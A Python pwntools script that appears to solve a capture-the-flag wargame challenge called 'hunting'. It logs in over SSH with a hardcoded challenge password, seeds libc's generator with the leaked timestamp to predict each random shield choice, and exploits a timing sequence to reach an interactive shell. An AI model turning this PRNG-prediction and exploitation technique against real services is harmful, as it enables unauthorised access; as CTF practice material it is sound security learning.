#!/usr/bin/env python

from pwn import *
import time
from ctypes import *
import sys
if len(sys.argv) == 1:
  r = process('./wrapper',setuid=False)
else:
  r = process(['sshpass', '-p', 'hunting', 'ssh', 'hunting', '/tmp/217/wrapper'])

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

time_stamp = int(r.recvline())
log.info('time %d' % time_stamp)
libc.srand(time_stamp)

def do_attack():
  r.sendline('2')
  shield = [1,3,2,1][libc.rand() % 4]
  r.sendline(str(shield))

pg = log.progress('upgrading')
t = 82
if len(sys.argv) != 1:
  t += 0
for _ in xrange(t):
  pg.status(str(_))
  do_attack()
  r.recvuntil('Activation')
pg.success()

log.info(r.recvuntil('level:4'))

r.sendline('3')
r.sendline('2') # sleep 1
libc.rand()
do_attack()

r.sendline('3')
r.sendline('7')
for i in xrange(3):
  libc.rand()
do_attack()

r.recvuntil('9223372036854775807')

time.sleep(2)

r.sendline('3')
r.sendline('2') # sleep 1
libc.rand()
do_attack()

r.sendline('3')
r.sendline('7')
for i in xrange(3):
  libc.rand()
do_attack()

r.interactive()
